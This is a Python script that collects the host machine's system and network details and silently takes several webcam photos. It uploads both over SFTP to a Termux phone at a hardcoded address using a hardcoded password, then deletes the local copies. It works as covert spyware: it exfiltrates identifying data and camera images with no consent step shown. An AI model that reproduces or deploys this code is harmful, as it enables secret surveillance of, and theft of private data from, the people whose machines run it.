import platform
import socket
import uuid
import cv2
import time
from datetime import datetime
import paramiko
import re
import psutil
import getpass
import os

# SSH connection details
TERMUX_IP = "192.168.x.x"  # Replace with Termux IP address
TERMUX_PORT = 8022  # Default Termux SSH port
USERNAME = "u0_a269"  # Termux username, usually 'u0_a'
PASSWORD = "7869"  # The password you set with `passwd`
REMOTE_PATH = "storage/downloads/"

def connect_to_termux():
    """Establishes an SSH connection to the Termux device."""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(TERMUX_IP, port=TERMUX_PORT, username=USERNAME, password=PASSWORD)
    return ssh_client

def get_device_info():
    """Collects device and system information."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = "Unable to retrieve IP"
    finally:
        s.close()

    boot_time = datetime.fromtimestamp(psutil.boot_time())
    return {
        "Device Name": platform.node(),
        "System": platform.system(),
        "System Version": platform.version(),
        "Processor": platform.processor(),
        "Machine": platform.machine(),
        "IP Address": ip_address,
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1]),
        "Current User": getpass.getuser(),
        "OS Release": platform.release(),
        "Total RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "Available RAM": f"{round(psutil.virtual_memory().available / (1024**3), 2)} GB",
        "Disk Total": f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
        "Disk Used": f"{round(psutil.disk_usage('/').used / (1024**3), 2)} GB",
        "Disk Free": f"{round(psutil.disk_usage('/').free / (1024**3), 2)} GB",
        "System Uptime": str(datetime.now() - boot_time),
        "Network Interfaces": "\n"+"\n".join(
    f"{interface}:\n  " + "\n  ".join(addr.address for addr in addrs)
    for interface, addrs in psutil.net_if_addrs().items()
)
    }

def log_info_to_termux(info, ssh_client):
    """Logs device info directly to the Termux device."""
    sftp_client = ssh_client.open_sftp()
    log_file_path = os.path.join(REMOTE_PATH, "device_info_log.txt")

    try:
        with sftp_client.open(log_file_path, "a") as remote_file:
            # Check if device info already exists in the log
            existing_content = sftp_client.open(log_file_path).read().decode('utf-8')
            if info["MAC Address"] in existing_content:
                print("Device info already logged on server. Skipping entry.")
                return False

            # Write new log entry if it doesn't exist
            remote_file.write(f"\n\n--- Device Info Logged at {datetime.now()} ---\n".encode('utf-8'))
            for key, value in info.items():
                remote_file.write(f"{key}: {value}\n".encode('utf-8'))
            print(f"Device info written to {log_file_path} on server.")
        return True
    except Exception as e:
        print(f"Error logging info to server: {e}")
        return False
    finally:
        sftp_client.close()


def get_next_image_filename(sftp_client):
    """Determines the next available filename for captured images in Termux."""
    existing_files = sftp_client.listdir(REMOTE_PATH)
    image_numbers = [int(re.search(r'(\d+)', f).group()) for f in existing_files if re.match(r'captured_image_\d+\.jpg', f)]
    next_number = max(image_numbers, default=0) + 1
    return f"captured_image_{next_number}.jpg"

def capture_and_transfer_images(ssh_client, image_count=5, interval=0.2):
    """Captures images and sends them directly to Termux, renaming if needed."""
    sftp_client = ssh_client.open_sftp()
    
    try:
        camera = cv2.VideoCapture(0)
        for i in range(image_count):
            ret, frame = camera.read()
            if ret:
                # Determine remote filename for the image
                remote_filename = get_next_image_filename(sftp_client)
                local_image_path = f"temp_image_{i}.jpg"
                
                # Save the image temporarily, then transfer and delete it
                cv2.imwrite(local_image_path, frame)
                sftp_client.put(local_image_path, os.path.join(REMOTE_PATH, remote_filename))
                print(f"Send")
                os.remove(local_image_path)  # Clean up local temporary file
            else:
                print("Failed to cap i.")
            time.sleep(interval)
        camera.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"Error capturing and transferring images: {e}")
    finally:
        sftp_client.close()

def main():
    # Establish SSH connection to Termux
    ssh_client = connect_to_termux()
    
    # Gather device info and log to Termux
    device_info = get_device_info()
    log_info_to_termux(device_info, ssh_client)
    
    # Capture images and transfer them to Termux
    capture_and_transfer_images(ssh_client)

    # Close SSH connection
    ssh_client.close()

if __name__ == "__main__":
    main()
